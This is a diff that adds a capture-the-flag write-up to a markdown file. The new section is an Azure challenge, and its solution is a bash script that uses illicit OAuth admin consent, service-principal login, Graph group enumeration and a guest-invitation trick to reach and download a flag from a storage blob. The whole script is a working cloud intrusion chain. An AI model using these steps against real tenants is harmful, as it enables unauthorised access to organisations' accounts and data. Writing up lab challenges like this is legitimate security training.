@@ -49,3 +49,128 @@ Good luck!
        - https://pwning.systems/posts/escaping-containers-for-fun/
   8. Finally, I got the flag from the host's file system.
 ![img](./image.png)
+## Challenge 3
+### Description
+#### Breaking The Barriers
+As an APT group targeting Azure, you've discovered a web app that creates admin users, but they are heavily restricted. To gain initial access, you've created a malicious OAuth app in your tenant and now seek to deploy it into the victim's tenant. Can you bypass the restrictions and capture the flag?
+
+The shell environment has been preloaded with your malicious OAuth app credentials and the target web app endpoint as environment variables. Use 'env | grep AZURE' or 'echo $WEB_APP_ENDPOINT' to view them.
+
+#### Hint
+- Look into illicit admin consent as an initial access vector.
+- To join the party, you'll need to dress your identity just right.
+- Groups open doors. This one opens an app - if you know where to look.
+
+#### Writeup
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+# Victim tenant ID (from domain azurectfchallengegame.com via https://www.whatismytenantid.com/)
+VICTIM_TENANT="d26f353d-c564-48e7-b26f-aa48c6eecd58"
+
+# Environment variables from challenge terminal
+AZURE_CLIENT_ID="abc"
+AZURE_CLIENT_SECRET="abc"
+WEB_APP_ENDPOINT="https://example.com/"
+
+# Use env vars as defaults if not set
+CLIENT_ID="${AZURE_CLIENT_ID:-}"
+CLIENT_SECRET="${AZURE_CLIENT_SECRET:-}"
+WEB_APP="${WEB_APP_ENDPOINT:-}"
+
+# Check required variables
+if [[ -z "$CLIENT_ID" || -z "$CLIENT_SECRET" || -z "$WEB_APP" ]]; then
+  echo "Missing required env vars. Make sure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, WEB_APP_ENDPOINT are set."
+  exit 1
+fi
+
+echo "Victim tenant: $VICTIM_TENANT"
+echo "Web app endpoint: $WEB_APP"
+echo
+
+# Step 1: Admin consent
+echo "[1] (manual) Open this admin-consent URL in a browser and approve as restricted admin of victim tenant:"
+echo "https://login.microsoftonline.com/$VICTIM_TENANT/adminconsent?client_id=$CLIENT_ID"
+read -p "Press ENTER after admin consent granted (or Ctrl-C to abort)..."
+
+# Step 2: Login as service principal
+echo "[2] Logging in as service principal into victim tenant..."
+az login --service-principal --username "$CLIENT_ID" --password "$CLIENT_SECRET" --tenant "$VICTIM_TENANT" --allow-no-subscriptions >/dev/null 2>&1
+
+# Step 3: Get Graph access token
+echo "[3] Retrieving Graph access token..."
+ACCESS_TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)
+if [[ -z "$ACCESS_TOKEN" ]]; then
+  echo "Failed to get access token"
+  exit 1
+fi
+echo "Token acquired."
+
+# Step 4: List groups
+echo "[4] Listing groups (top-level)..."
+curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "https://graph.microsoft.com/v1.0/groups"
+echo
+
+# Step 5: Invite guest
+echo "[5] Invite a guest whose displayName starts with 'CTF' (you must control the email to redeem invitation)."
+read -p "Enter a temporary email you control (e.g. ctf123@nullsto.edu.pl): " TEMPEMAIL
+read -p "Confirm invite $TEMPEMAIL with displayName 'CTF'? (y/N): " CONF
+if [[ "$CONF" != "y" && "$CONF" != "Y" ]]; then
+  echo "Aborted invite."
+  exit 0
+fi
+
+INV_JSON=$(mktemp)
+trap 'rm -f "$INV_JSON"' EXIT
+cat > "$INV_JSON" <<EOF
+{
+  "invitedUserEmailAddress": "$TEMPEMAIL",
+  "inviteRedirectUrl": "$WEB_APP",
+  "invitedUserDisplayName": "CTF",
+  "sendInvitationMessage": true
+}
+EOF
+
+INV_RESPONSE=$(curl -s -X POST "https://graph.microsoft.com/v1.0/invitations" \
+  -H "Authorization: Bearer $ACCESS_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d @"$INV_JSON")
+
+echo "$INV_RESPONSE"
+if [[ "$INV_RESPONSE" == *"error"* ]]; then
+  echo "Invitation failed."
+  exit 1
+fi
+echo "Invitation created. Redeem it from the target email to activate the guest account."
+
+# Step 6: Redeem invitation
+echo "[6] (manual) Redeem the invitation in your email."
+read -p "Press ENTER after redeeming the invitation (or Ctrl-C to abort)..."
+
+# Step 7: Logout and login as guest
+echo "[7] Logging out from service principal session..."
+az logout >/dev/null 2>&1
+
+echo "[8] Logging in as guest into victim tenant..."
+echo "To sign in, open https://microsoft.com/devicelogin in a browser and enter the code provided by the CLI."
+az login --tenant "$VICTIM_TENANT" --use-device-code
+
+# Step 9: Download flag
+echo "[9] Downloading the flag..."
+az storage blob download \
+  --account-name azurechallengectfflag \
+  --container-name grab-the-flag \
+  --name ctf_flag.txt \
+  --file "ctf_flag.txt" \
+  --auth-mode login
+
+if [[ $? -ne 0 ]]; then
+  echo "Failed to download flag."
+  exit 1
+fi
+
+# Step 10: View flag
+echo "[10] Viewing the flag..."
+cat ctf_flag.txt
+```
